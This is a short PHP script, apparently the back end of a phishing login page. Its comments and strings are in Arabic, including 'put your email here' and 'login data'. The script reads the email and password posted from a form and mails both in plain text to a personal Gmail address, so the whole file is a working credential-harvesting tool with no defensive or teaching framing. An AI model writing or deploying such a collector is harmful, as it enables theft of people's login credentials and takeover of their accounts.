<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $to = "issam.s.g22@gmail.com"; // ضع إيميلك هنا
    $subject = "بيانات تسجيل الدخول";
    $message = "الإيميل: " . $email . "\nكلمة المرور: " . $password;
    $headers = "From: no-reply@yourdomain.com";

    mail($to, $subject, $message, $headers);
}
?>
